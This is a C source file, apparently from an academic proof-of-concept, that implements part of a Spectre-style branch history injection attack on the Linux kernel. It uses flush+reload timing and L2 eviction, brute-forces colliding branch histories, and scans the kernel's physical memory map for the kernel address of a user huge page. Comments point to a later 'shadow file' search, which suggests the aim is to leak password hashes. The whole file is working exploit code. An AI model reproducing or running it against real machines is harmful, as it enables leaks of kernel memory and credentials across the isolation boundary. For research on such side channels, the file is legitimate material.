/*
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */


#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"

#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/epoll.h>

#include <sys/time.h>
#include <sys/resource.h>
#include <string.h>

#include "../../../common/l2_eviction/evict_l2.h"

// #define DEBUG

#define DEFAULT_NUMBER_OF_HUGE_PAGES 256
// Depending on the number of huge page, you increase the HP search alignment
#define DEFAULT_SEARCH_ALIGNMENT (1LU << 24)

uint64_t NUMBER_OF_HUGE_PAGES = DEFAULT_NUMBER_OF_HUGE_PAGES;
uint64_t SEARCH_ALIGNMENT = DEFAULT_SEARCH_ALIGNMENT;

uint64_t rand_64(){

    assert(RAND_MAX >= 0xffff);

    return (
            (((uint64_t) rand() & 0xffffLU) << 48) |
            (((uint64_t) rand() & 0xffffLU) << 32) |
            (((uint64_t) rand() & 0xffffLU) << 16) |
            ((uint64_t) rand() & 0xffffLU)
        );
}

int find_colliding_history(struct config * cfg, uint64_t max_tries) {

    uint64_t hits = 0;
    int iter = 0;

    set_load_chain_simple_touch(cfg, 3);

    cfg->train_rand_arg1 = 0xffffffffffffffff;
    cfg->train_rand_arg2 = 0xffffffffffffffff;

    cfg->reload_addr = cfg->fr_buf;


    while(1) {
        iter++;
        if((iter % 10000) == 0){
            printf("\rTries: %d", iter);
            fflush(stdout);

        }

        if (iter > max_tries) {
            return EXIT_FAILURE;
        }

        cfg->rand_arg1 = rand_64();
        cfg->rand_arg2 = rand_64();
        cfg->rand_arg3 = rand_64();


        // do test
        hits = do_flush_and_reload(cfg, 5, 0);

        if(hits > 0) {

            printf("\n>> Found collision in %d tries (%ld/5 hits)\n", iter, hits);

            hits = do_flush_and_reload(cfg, 20000, 0);

            printf("   Verification: %ld/20000 hits\n", hits);

            if (hits < 1000) {
                continue;
            }

        #ifdef DEBUG
            printf("RAND1: %lu\n", cfg->rand_arg1);
            printf("RAND2: %lu\n", cfg->rand_arg2);
            printf("RAND3: %lu\n", cfg->rand_arg3);
        #endif

            break;

        }

    }

    return EXIT_SUCCESS;

}


// struct epoll_event event = {.events=0, .data=0};

static void __always_inline __attribute__((always_inline)) trigger_target(struct config * cfg){

    assert(syscall(__NR_select, /*n=*/4, /*inp=*/0x0,/*outp=*/&cfg->fd_set, /*exp=*/0ul, /*tvp=*/0x0, cfg->train_rand_arg1) == 1);

}

static uint8_t * __attribute__ ((noinline)) collide_to_syscalls(struct config * cfg, uint64_t iterations, uint8_t ** huge_pages) {

    void ** reload_addr, **start;

    uint8_t hits[DEFAULT_NUMBER_OF_HUGE_PAGES] = {0};



    for(int iter=0; iter<iterations; iter++) {

        for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
            asm volatile("clflush (%0)\n"::"r"(huge_pages[i] + 0x2000));
        }
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));

        // train
        trigger_target(cfg);
        trigger_target(cfg);

        evict(cfg->ev_set_l2);

        asm volatile("mfence\n");

        syscall(VICTIM_SYSCALL, cfg->rand_arg1,(uint64_t) cfg->fr_buf_kern + 0x2000 - T_SECRET_ADDR__OFFSET, (uint64_t) cfg->fr_buf_kern + 0x2000, cfg->gadget_arg_base, (uint64_t) cfg->rand_arg2, cfg->rand_arg3);

        asm volatile("mfence\n");

        start = (void **) (*(huge_pages));
        reload_addr = start;
        int idx = 0;

        // This prevents the prefetcher for touching our reloadbuffer
        do {
            if(load_time((uint8_t *) (reload_addr) + 0x2000) < THR) {
                return huge_pages[idx];
            }

		    reload_addr = *reload_addr;
            idx += 1;
	    } while (reload_addr != start);


    }

    return 0;

}

__always_inline static uint8_t * reload_any_huge_page(struct config * cfg, uint8_t ** huge_pages) {

    for (size_t iter = 0; iter < COLLISION_TRIES; iter++)
    {

        cfg->rand_arg1 = rand_64();
        cfg->rand_arg2 = rand_64();
        cfg->rand_arg3 = rand_64();
        cfg->train_rand_arg1 = rand_64();
        cfg->train_rand_arg2 = rand_64();

        uint8_t * addr = collide_to_syscalls(cfg, 5, huge_pages);

        if (addr) {
            return addr;
        }

    }

    return 0;

}


int find_hp_kern_address(struct config * cfg, uint64_t only_honey_pages) {

    uint64_t mem_total = get_mem_total();
    uint64_t mem_used = get_mem_used();
    uint64_t offset;

    if (mem_total > (8LU * (1LU << 30))) {
        offset = (mem_total / 10) & ~(SEARCH_ALIGNMENT - 1);
        // never more than 4 GB
        if (offset > 4LU * (1LU << 30)) {
            offset = 4LU * (1LU << 30) & ~(SEARCH_ALIGNMENT - 1);
        }
    } else {
        SEARCH_ALIGNMENT = 1LU << 22;
        NUMBER_OF_HUGE_PAGES = DEFAULT_NUMBER_OF_HUGE_PAGES / 5;
        offset = (mem_used / 4) & ~(SEARCH_ALIGNMENT - 1);
    }

    // // offset2 2LU * (1LU << 30) & ~(SEARCH_ALIGNMENT - 1);

    printf("Allocating %ld huge pages...\n", NUMBER_OF_HUGE_PAGES);

    // ------------------------------------------------------------------------
    // Initialize the huge pages

    uint8_t * huge_pages[NUMBER_OF_HUGE_PAGES];
    huge_pages[0] = cfg->ind_map;


    for (int i = 1; i < NUMBER_OF_HUGE_PAGES; i++)
    {
        huge_pages[i] = allocate_huge_page();
        // Mark the huge page with the honey signature, we can use hits
        // during the shadow file search
        *(uint64_t *)huge_pages[i] = *(uint64_t *) HONEY_PAGE_SIGNATURE;
    }

    for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
        *(uint8_t **)(huge_pages[i]) = huge_pages[(i + 1) % NUMBER_OF_HUGE_PAGES];
    }

    if (only_honey_pages) {
        return 0;
    }


    uint8_t * huge_page_kern = cfg->phys_start + offset;
    uint8_t * huge_page_user = 0;

#ifdef DEBUG
    uint8_t * ind_map_kern_real = (uint8_t *)(virt_to_physmap((uint64_t)huge_pages[DEFAULT_NUMBER_OF_HUGE_PAGES - 1], (uint64_t) cfg->phys_start));


    for (size_t i = 0; i < NUMBER_OF_HUGE_PAGES; i++)
    {
        ind_map_kern_real = (uint8_t *)(virt_to_physmap((uint64_t)huge_pages[i], (uint64_t) cfg->phys_start));
        printf("   Verified kern address: %p (phys_map start + %2luGB) : %p\n", ind_map_kern_real, (ind_map_kern_real - cfg->phys_start) / (1 << 30), huge_pages[i]);
    }
#endif


    // ------------------------------------------------------------------------
    // Start the huge page search
    uint64_t iter = 0;

    for (; huge_page_kern < cfg->phys_end; huge_page_kern += SEARCH_ALIGNMENT)
    {
        iter++;
        if ((uint64_t) huge_page_kern % (SEARCH_ALIGNMENT << 2) == 0) {
            printf("\rTesting Kernel Huge Page: %p (phys_map start + %2luGB)", huge_page_kern, (huge_page_kern - cfg->phys_start) / (1 << 30));
            fflush(stdout);
        }

        cfg->ind_map_kern = huge_page_kern;
        cfg->fr_buf_kern = huge_page_kern;
        cfg->fr_buf = huge_pages[DEFAULT_NUMBER_OF_HUGE_PAGES - 1];

        huge_page_user = reload_any_huge_page(cfg, huge_pages);

        if(huge_page_user) {
#ifdef DEBUG
            ind_map_kern_real = (uint8_t *)(virt_to_physmap((uint64_t)huge_page_user, (uint64_t) cfg->phys_start));
            printf("   Verified kern address: %p (phys_map start + %2luGB)\n", ind_map_kern_real, (ind_map_kern_real - cfg->phys_start) / (1 << 30));
#endif
            printf("Iteration: %ld\n", iter);
            cfg->ind_map = huge_page_user;

            // ----------------------------------------------------------------

            // back-up chain
            uint8_t * next_huge_page = *(uint8_t **) huge_page_user;

            printf("%20s: %#18lx | %20s: %#18lx\n", "User Huge Page", (uint64_t) cfg->ind_map, "Kernel Huge Page", (uint64_t) cfg->ind_map_kern);

            cfg->fr_buf = cfg->ind_map + 0x2000;
            cfg->fr_buf_kern = cfg->ind_map_kern + 0x2000;
            printf("%20s: %#18lx | %20s: %#18lx\n", "User FR_BUF", (uint64_t) cfg->fr_buf, "Kernel FR_BUF", (uint64_t) cfg->fr_buf_kern);

            memset(cfg->fr_buf, 0x90, 0x1000);



            printf("------------------------------------------------------\n");
            printf("Find a colliding history for the victim -> target\n");
            printf("------------------------------------------------------\n");

            if (find_colliding_history(cfg, 2000000)) {
                printf("\nFailed finding colliding history, finding new huge-page pair...\n");

                // restore chain
                *(uint8_t **) huge_page_user = next_huge_page;
                continue;
            };

            return 0;
        }

    }

    // We did not found it

    return 1;

}
